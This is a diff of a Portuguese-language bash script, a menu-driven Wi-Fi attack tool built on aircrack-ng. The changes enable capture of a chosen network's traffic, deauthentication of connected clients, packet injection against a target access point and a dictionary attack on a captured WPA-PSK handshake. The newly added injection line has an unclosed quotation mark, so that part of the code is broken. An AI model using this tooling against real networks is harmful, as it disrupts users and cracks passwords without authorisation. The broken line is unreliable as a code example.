@@ -29,16 +29,16 @@ function verificar_dependencias(){
 		echo "[ FALHA ] aircrack-ng nao instalado!"
 		exit 1
 	fi
-	
+
 	#if ! hash xfce4-terminal 2> /dev/null; then
 	#	echo "[ FALHA ] xfce4-terminal nao instalado!"
-	#	exit 1	
+	#	exit 1
 	#fi
 
 	if ! hash reaver 2> /dev/null; then
 		echo "[ FALHA ] reaver nao instalado!"
 		exit 1
-	fi	
+	fi
 }
 
 function iniciar_mon() {
@@ -90,7 +90,7 @@ function setar_parametros(){
 	--center &)
 
 	#--field "[ Wordlist ]":BTN "yad --file --maximized" \
-	
+
 	BSSID=$(echo "$PARAMETROS" | cut -d '|' -f 1)
 	ESSID=$(echo "$PARAMETROS" | cut -d '|' -f 2)
 	CHANNEL=$(echo "$PARAMETROS" | cut -d '|' -f 3)
@@ -109,6 +109,7 @@ if [ -z $BSSID  ] || [ -z $ESSID ] || [ -z $CHANNEL ] || [ -z $INTERFACE_MON ] ;
 	exit 1
 fi
 
+# Capture no minimo 5000 (5 mil) pacotes do tipo data frame (#Data) antes de tentar realizar a quebra da senha
 (xterm -geometry 85x25 -title "Escaneando rede a sem fio $ESSID" \
 -e "airodump-ng --bssid $BSSID --essid $ESSID --channel $CHANNEL --write $DIR/$ARQ $INTERFACE_MON" &) || \
 echo -e "[ FALHA ] Ocorreram erros em escanear a rede sem fio: $ESSID"
@@ -131,30 +132,33 @@ echo "[ FALHA ] Ocorreram erros em fazer o deuth da STA $CLIENT na rede $ESSID"
 
 }
 
-#function deauth_mdk3() {
-#(xterm -geometry 85x25 -title "Desautenticando usando mdk3 AP: $ESSID" \
-#-e "mdk3 $INTERFACE_MON $OUTPUT/mdk3.txt -c $CLINT) & || \
-#echo "[ FALHA ]"
-#}
-
-
 function injetar(){
-(xterm -geometry 85x25i --title "Injetando pacotes " aireplay-ng --interactive 1000 -c $CLIENTE $INTERFACE_MON) || echo "[ FALHA ]"
+# Realizar testes de injecao contra um AP especifico
+(xterm -geometry 85x25 -title "Tentando realizar Injecaode pacotes no AP: $ESSID" \
+-e "aireplay-ng -9 -a $BSSID -e $ESSID $INTERFACE_MON) || \
+echo "[ FALHA ] Nao foi possivel injetar pacotes no AP: $ESSID"
 
 }
 
-#function brute_force_psk() {
-#(aircrack-ng -w $WORDLIST $OUTPUT/$ARQ) || echo "[ FALHA ]"
-#}
+function brute_force_psk(){
+# Redes que utilizam chaves criptograficas pre-compartilhadas do tipo Personal (PSK) sofrem de ataque de dicionario,
+#pois a chave PTK pode ser reproduzida com a captura do 4-way handshake - MORENO, Daniel.
+
+# Realizar a quebra da senha, por meio de um dicionario (wordlist)
+(aircrack-ng -w $WORDLIST $OUTPUT/$ARQ) || \
+echo "[ FALHA ] Ocorreram erros, verifique a wordlist"
+
+}
 
 function matar_todos_processos() {
-
+# Matar todos processos e, reniciar servicos de gerenciamento de rede
 iw dev wlan0mon del
 pkill xterm
 pkill airodump-ng
 pkill aireplay-ng
-pkill airmon-ng 
-service networking restart
+pkill airmon-ng
+pkill yad
+service network-manager restart
 
 }
 
@@ -218,9 +222,9 @@ cat << EOF
 2. Varrer todas as redes sem fio alcancadas
 3. Varrer rede especifica
 4. Desautenticar todos as STA de um AP
-5. Desautenticar uma STA de um AP 
+5. Desautenticar uma STA de um AP
 6. Injetar pacotes em um AP
-6. Sair
+7. Sair
 
 EOF
 read -p "> " opt
